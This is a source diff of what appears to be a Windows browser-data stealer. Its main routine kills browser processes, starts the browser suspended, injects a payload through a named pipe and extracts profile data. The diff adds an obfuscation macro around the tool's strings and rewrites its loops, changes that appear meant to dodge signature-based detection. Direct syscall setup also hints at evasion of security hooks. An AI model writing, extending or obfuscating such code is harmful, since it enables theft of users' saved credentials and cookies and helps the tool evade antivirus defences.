@@ -3,6 +3,7 @@
 
 #include "../core/common.hpp"
 #include "../core/console.hpp"
+#include "../core/obfuscate.hpp"
 #include "../sys/internal_api.hpp"
 #include "browser_discovery.hpp"
 #include "browser_terminator.hpp"
@@ -26,28 +27,30 @@ void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, 
 
     try {
         if (killFirst) {
-            console.Debug("Terminating browser processes...");
-            
+            console.Debug(OBF("Terminating browser processes...").c_str());
+
             BrowserTerminator terminator(console);
             TerminationOptions opts;
             opts.terminateChildren = true;
             opts.waitForExit = true;
-            
+
             auto termStats = terminator.KillByExeName(browser.exeName, opts);
             if (termStats.processesTerminated > 0) {
                 std::string pidList;
-                for (size_t i = 0; i < termStats.terminatedPids.size(); ++i) {
-                    if (i > 0) pidList += ", ";
-                    pidList += std::to_string(termStats.terminatedPids[i]);
+                size_t pi = 0;
+                while (pi < termStats.terminatedPids.size()) {
+                    if (pi > 0) pidList += ", ";
+                    pidList += std::to_string(termStats.terminatedPids[pi]);
+                    ++pi;
                 }
-                console.Debug("  [+] Processes terminated (PID: " + pidList + ")");
+                console.Debug(std::string(OBF("  [+] Processes terminated (PID: ").c_str()) + pidList + ")");
             } else {
                 console.Debug("  [+] No running processes found");
             }
             Sleep(300);
         }
 
-        console.Debug("Creating suspended process: " + Core::ToUtf8(browser.fullPath));
+        console.Debug(std::string(OBF("Creating suspended process: ").c_str()) + Core::ToUtf8(browser.fullPath));
         ProcessManager procMgr(browser);
         procMgr.CreateSuspended();
         console.Debug("  [+] Process created (PID: " + std::to_string(procMgr.GetPid()) + ")");
@@ -59,7 +62,7 @@ void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, 
         PayloadInjector injector(procMgr, console);
         injector.Inject(pipe.GetName());
 
-        console.Debug("Awaiting payload connection...");
+        console.Debug(OBF("Awaiting payload connection...").c_str());
         pipe.WaitForClient(procMgr.GetProcessHandle());
         console.Debug("  [+] Payload connected");
         
@@ -75,7 +78,7 @@ void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, 
                            pStats.profiles, (output / browser.displayName).string());
             stats.successful++;
         } else {
-            console.Warn("No data extracted");
+            console.Warn(OBF("No data extracted").c_str());
             stats.failed++;
         }
         
@@ -96,7 +99,8 @@ int wmain(int argc, wchar_t* argv[]) {
 
     Core::Console console(false);
 
-    for (int i = 1; i < argc; ++i) {
+    int i = 1;
+    while (i < argc) {
         std::wstring arg = argv[i];
         if (arg == L"--verbose" || arg == L"-v") verbose = true;
         else if (arg == L"--fingerprint" || arg == L"-f") fingerprint = true;
@@ -107,6 +111,7 @@ int wmain(int argc, wchar_t* argv[]) {
             return 0;
         }
         else if (targetType.empty() && arg[0] != L'-') targetType = arg;
+        ++i;
     }
 
     Core::Console mainConsole(verbose);
@@ -118,7 +123,7 @@ int wmain(int argc, wchar_t* argv[]) {
     }
 
     if (!Sys::InitApi(verbose)) {
-        mainConsole.Error("Syscall initialization failed");
+        mainConsole.Error(OBF("Syscall initialization failed").c_str());
         return 1;
     }
 
@@ -129,16 +134,18 @@ int wmain(int argc, wchar_t* argv[]) {
     if (targetType == L"all") {
         auto browsers = BrowserDiscovery::FindAll();
         if (browsers.empty()) {
-            mainConsole.Warn("No supported browsers found");
+            mainConsole.Warn(OBF("No supported browsers found").c_str());
             return 0;
         }
-        for (const auto& browser : browsers) {
-            ProcessBrowser(browser, verbose, fingerprint, killBrowsers, output, mainConsole, stats);
+        auto bit = browsers.begin();
+        while (bit != browsers.end()) {
+            ProcessBrowser(*bit, verbose, fingerprint, killBrowsers, output, mainConsole, stats);
+            ++bit;
         }
     } else {
         auto browser = BrowserDiscovery::FindSpecific(targetType);
         if (!browser) {
-            mainConsole.Error("Browser not found: " + Core::ToUtf8(targetType));
+            mainConsole.Error(std::string(OBF("Browser not found: ").c_str()) + Core::ToUtf8(targetType));
             return 1;
         }
         ProcessBrowser(*browser, verbose, fingerprint, killBrowsers, output, mainConsole, stats);
